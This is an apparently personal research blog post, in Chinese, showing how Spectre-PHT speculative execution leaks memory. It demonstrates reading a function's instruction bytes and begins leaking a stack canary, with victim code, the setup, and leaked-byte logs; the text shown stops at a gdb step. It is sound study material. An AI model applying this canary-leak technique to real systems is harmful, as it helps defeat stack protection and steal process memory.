@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="iamywang">
+    
+    <title>
+        
+            体系结构与内存安全（2）——利用Spectre-PHT推测执行泄漏内存数据 |
+        
+        没事我就挠脑袋
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.jpg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"iamywang.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0f59a4","title":"没事我就挠脑袋","author":"iamywang","avatar":"/images/logo.jpg","logo":"/images/logo.jpg","favicon":"/images/logo.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","tags":"/tags || fa-solid fa-tags","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"A Ph.D. Candidate Interested in Computer Architecture and Side-Channels. || 一个对计算机体系结构、侧信道攻击感兴趣的博士生。","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/iamywang","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":"https://x.com/iamywang","facebook":"https://www.facebook.com/iamywang10","email":"wangquancheng@whu.edu.cn","orcid":"https://orcid.org/0000-0002-0313-1853","scholar":"https://scholar.google.com/citations?user=KhWFO6sAAAAJ&hl=en"}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":false,"post_datetime":"created"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":"iamywang/iamywang.github.io","repo_id":"MDEwOlJlcG9zaXRvcnkxNTY0OTIyOTA=","category":"Announcements","category_id":"DIC_kwDOCVPiAs4CaIL_","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2022,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null]},"root":"","source_data":{"links":[{"title":"朋友们"},{"name":"zu1k","link":"https://zu1k.com/","description":"A boy dreaming of traveling around the world.","avatar":"https://zu1k.com/images/logo.jpg"},{"name":"Sarace","link":"https://blog.huisa.win/","description":"Knowledge comes from books and from experience of the world.","avatar":"https://blog.huisa.win/favicon-256x256.png"}],"icons":{"scholar":{"svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"><!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--><path d=\"M390.9 298.5c0 0 0 .1 .1 .1c9.2 19.4 14.4 41.1 14.4 64C405.3 445.1 338.5 512 256 512s-149.3-66.9-149.3-149.3c0-22.9 5.2-44.6 14.4-64h0c1.7-3.6 3.6-7.2 5.6-10.7c4.4-7.6 9.4-14.7 15-21.3c27.4-32.6 68.5-53.3 114.4-53.3c33.6 0 64.6 11.1 89.6 29.9c9.1 6.9 17.4 14.7 24.8 23.5c5.6 6.6 10.6 13.8 15 21.3c2 3.4 3.8 7 5.5 10.5zm26.4-18.8c-30.1-58.4-91-98.4-161.3-98.4s-131.2 40-161.3 98.4L0 202.7 256 0 512 202.7l-94.7 77.1z\"/></svg>","link":"https://scholar.google.com/citations?user=KhWFO6sAAAAJ&hl=en"}}},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               没事我就挠脑袋
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                </span>
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        体系结构与内存安全（2）——利用Spectre-PHT推测执行泄漏内存数据
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/logo.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">iamywang</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-03-04 20:00:00</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Mar 04 2025 20:00:00 GMT+0800">2025-03-04 20:00:00</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8/">内存安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/">体系结构</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8/">内存安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CPU%E6%BC%8F%E6%B4%9E/">CPU漏洞</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%8E%A8%E6%B5%8B%E6%89%A7%E8%A1%8C/">推测执行</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="Spectre攻击的基本原理"><a href="#Spectre攻击的基本原理" class="headerlink" title="Spectre攻击的基本原理"></a>Spectre攻击的基本原理</h2><p>分支预测器采用模式历史表（PHT）预测直接分支的跳转地址，Kocher等人发现可以重复训练分支预测器使其预测错误，在错误执行路径到恢复正确执行路径之间的暂态执行窗口中执行暂态指令窃取秘密数据，这一成果发表于2019年的信息安全四大顶级学术会议之一的IEEE Oakland（S&amp;P）上。</p>
+<p>利用这一漏洞，攻击者能够成功打破计算机的内核地址空间随机化机制（KASLR），破坏内存隔离机制从而窃取其他进程的秘密数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">victim_function</span><span class="params">(<span class="type">size_t</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; array1_size) &#123;</span><br><span class="line">    temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Spectre攻击的受害者示例代码如上所示。正常逻辑下，应先对变量x进行边界检查，根据检查结果选择正确的分支。但在实现了分支预测的现代处理器架构中，为了提高处理器的效率，在判断语句完成之前，处理器会继续处理最有可能的分支。这种先执行后判断的预测机制产生了边界检查绕过的安全漏洞：</p>
+<ul>
+<li>第一步：攻击者反复传递合法的x来训练分支预测器的预测方向为true，同时清除缓存中的数据以防止例外的命中情况发生；</li>
+<li>第二步：攻击者传递越界的x, 由于分支预测器仍然预测分支结果为true，从而触发受害者程序进入暂态执行。同时，在暂态执行期间受害者的代码会越界访问秘密数据，并且使得共享数组array2与秘密数据相关的数据进入缓存。</li>
+<li>第三步：攻击者通过对数组进行遍历，测量每次的访问时间，出缓存命中的地址，从而推测出秘密数据。</li>
+</ul>
+<h2 id="实验环境与基本配置"><a href="#实验环境与基本配置" class="headerlink" title="实验环境与基本配置"></a>实验环境与基本配置</h2><h3 id="系统和编译配置"><a href="#系统和编译配置" class="headerlink" title="系统和编译配置"></a>系统和编译配置</h3><ul>
+<li>CPU：Intel AlderLake i7-12700；</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu</span><br><span class="line">架构：                    x86_64</span><br><span class="line">  CPU 运行模式：          32-bit, 64-bit</span><br><span class="line">  Address sizes:          46 bits physical, 48 bits virtual</span><br><span class="line">  字节序：                Little Endian</span><br><span class="line">CPU:                      20</span><br><span class="line">  在线 CPU 列表：         0-19</span><br><span class="line">厂商 ID：                 GenuineIntel</span><br><span class="line">  型号名称：              12th Gen Intel(R) Core(TM) i7-12700</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>操作系统：ArchLinux Rolling；</li>
+<li>内核版本：Linux LTS 5.15.178，20250204；</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ARCH-IAMYWANG 5.15.178-1-lts515 <span class="comment">#1 SMP Tue, 04 Feb 2025 20:46:47 +0000 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>gcc版本：14.2.1，20250207；</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -v             </span><br><span class="line">使用内建 specs。</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-pc-linux-gnu/14.2.1/lto-wrapper</span><br><span class="line">目标：x86_64-pc-linux-gnu</span><br><span class="line">配置为：/build/gcc/src/gcc/configure --enable-languages=ada,c,c++,d,fortran,go,lto,m2,objc,obj-c++,rust --enable-bootstrap --prefix=/usr --libdir=/usr/lib --libexecdir=/usr/lib --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=https://gitlab.archlinux.org/archlinux/packaging/packages/gcc/-/issues --with-build-config=bootstrap-lto --with-linker-hash-style=gnu --with-system-zlib --enable-__cxa_atexit --enable-cet=auto --enable-checking=release --enable-clocale=gnu --enable-default-pie --enable-default-ssp --enable-gnu-indirect-function --enable-gnu-unique-object --enable-libstdcxx-backtrace --enable-link-serialization=1 --enable-linker-build-id --enable-lto --enable-multilib --enable-plugin --enable-shared --enable-threads=posix --disable-libssp --disable-libstdcxx-pch --disable-werror</span><br><span class="line">线程模型：posix</span><br><span class="line">支持的 LTO 压缩算法：zlib zstd</span><br><span class="line">gcc 版本 14.2.1 20250207 (GCC) </span><br></pre></td></tr></table></figure>
+
+<h3 id="可执行程序配置"><a href="#可执行程序配置" class="headerlink" title="可执行程序配置"></a>可执行程序配置</h3><ul>
+<li>漏洞变体：Oakland’19，Spectre-PHT原始版本；</li>
+<li>ASLR：已关闭（设置为0）；</li>
+<li>Canary栈保护：已开启；</li>
+<li>PIE随机化：已开启（此时PIE仅带来类似KASLR的确定性地址偏移）；</li>
+<li>NX栈不可执行：已开启。</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">File:     a.out</span><br><span class="line">Arch:     amd64</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul>
+<li>正常情况下，读写某些特定内存区域的具体值不需要额外的权限；</li>
+<li>但是，在程序执行过程中，或者说从ISA的角度（也就是反汇编得到的指令序列以及相应的内存访问的角度），程序无法显式访问比较敏感的内存区域；</li>
+<li>我们利用Spectre-PHT攻击的目标就是读取这些敏感区域。</li>
+</ul>
+<h2 id="验证Spectre-PHT能够任意读取内存：指令区域"><a href="#验证Spectre-PHT能够任意读取内存：指令区域" class="headerlink" title="验证Spectre-PHT能够任意读取内存：指令区域"></a>验证Spectre-PHT能够任意读取内存：指令区域</h2><p>现有的研究工作中，研究人员通常将数据段的内存泄漏作为微架构安全漏洞攻击的演示案例。我们通过简单的实验证明指令区域同样可以任意泄漏。</p>
+<h3 id="步骤1：计算PIE偏移量"><a href="#步骤1：计算PIE偏移量" class="headerlink" title="步骤1：计算PIE偏移量"></a>步骤1：计算PIE偏移量</h3><p>在开启PIE的情况下（由于系统ASLR设置为0，此时PIE仅带来类似KASLR的确定性地址偏移），计算程序代码中某个函数的地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hijack function address:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%zx\n&quot;</span>, (<span class="type">size_t</span>)hijack);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">Hijack <span class="keyword">function</span> address:</span><br><span class="line">5555555557da</span><br></pre></td></tr></table></figure>
+
+<p>利用objdump反编译得到的函数入口地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000000017da &lt;hijack&gt;:</span><br><span class="line">    17da:	55                   	push   %rbp</span><br><span class="line">    17db:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    17de:	48 8d 05 cb 08 00 00 	lea    0x8cb(%rip),%rax        # 20b0 &lt;_IO_stdin_used+0xb0&gt;</span><br><span class="line">    17e5:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">    17e8:	e8 53 f8 ff ff       	call   1040 &lt;puts@plt&gt;</span><br><span class="line">    17ed:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">    17f2:	e8 79 f8 ff ff       	call   1070 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因此可以计算出PIE随机化的偏移量：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python cal.py</span><br><span class="line">0x555555554000</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤2：利用Spectre-PHT读取hijack函数的指令序列"><a href="#步骤2：利用Spectre-PHT读取hijack函数的指令序列" class="headerlink" title="步骤2：利用Spectre-PHT读取hijack函数的指令序列"></a>步骤2：利用Spectre-PHT读取hijack函数的指令序列</h3><p>读取过程仅需微调原始Spectre-PHT的代码，将地址修改为hijack函数的地址：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">Reading at malicious_x = 0x5555555557da... Success: 0x55=’U’ score=15 (second best: 0xFF=’?’ score=5)</span><br><span class="line">Reading at malicious_x = 0x5555555557db... Success: 0x48=’H’ score=7 (second best: 0xFF=’?’ score=1)</span><br><span class="line">Reading at malicious_x = 0x5555555557dc... Success: 0x89=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557dd... Success: 0xe5=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557de... Success: 0x48=’H’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557df... Success: 0x8d=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e0... Success: 0x05=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e1... Success: 0xcb=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e2... Success: 0x08=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e3... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e4... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e5... Success: 0x48=’H’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e6... Success: 0x89=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e7... Success: 0xc7=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e8... Success: 0xe8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557e9... Success: 0x53=’S’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557ea... Success: 0xf8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557eb... Success: 0xff=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557ec... Success: 0xff=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557ed... Success: 0xbf=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557ee... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557ef... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f0... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f1... Success: 0x00=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f2... Success: 0xe8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f3... Success: 0x79=’y’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f4... Success: 0xf8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f5... Success: 0xff=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x5555555557f6... Success: 0xff=’?’ score=2 </span><br></pre></td></tr></table></figure>
+
+<p>读取结果为：<br><code>55 48 89 e5 ...</code></p>
+<p>通过对比Spectre-PHT的读取结果与objdump的反汇编结果，能够验证Spectre-PHT攻击可以有效泄漏指令区域的内存数据。</p>
+<h2 id="验证Spectre-PHT能够任意读取内存：栈保护"><a href="#验证Spectre-PHT能够任意读取内存：栈保护" class="headerlink" title="验证Spectre-PHT能够任意读取内存：栈保护"></a>验证Spectre-PHT能够任意读取内存：栈保护</h2><p>现有的研究工作中，仅有2022年发表于IEEE S&amp;P上的SpecHammer攻击，通过结合Spectre-PHT推测执行漏洞与RowHammer比特翻转攻击，实现了栈保护canary的绕过。我们同样通过简单的实验证明，如果存在特定的gadget，仅仅依赖于Spectre-PHT攻击也可以达成此效果。</p>
+<h3 id="步骤1：计算Canary的地址"><a href="#步骤1：计算Canary的地址" class="headerlink" title="步骤1：计算Canary的地址"></a>步骤1：计算Canary的地址</h3><p>我们预先在main函数中准备了一个长度为16字节的<code>buf</code>变量，在关闭地址随机化的前提下，<code>rbp</code>的地址为<code>buf+16+16</code>，canary的地址为<code>rbp-8</code>，即<code>rbp+32</code>。因此，在本地攻击中我们将推测窃取的目标地址设置为<code>buf+0x18</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading stack canary with Spectre-PHT:\n&quot;</span>);</span><br><span class="line">  spec((<span class="type">size_t</span>)buf + <span class="number">0x18</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤2：利用gdb调试获取真实的Canary"><a href="#步骤2：利用gdb调试获取真实的Canary" class="headerlink" title="步骤2：利用gdb调试获取真实的Canary"></a>步骤2：利用gdb调试获取真实的Canary</h3><p>首先，在main函数处添加断点：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">break</span> main</span><br><span class="line">Breakpoint 1 at 0x17fb</span><br></pre></td></tr></table></figure>
+
+<p>其次，run并记录正确的canary值：</p>
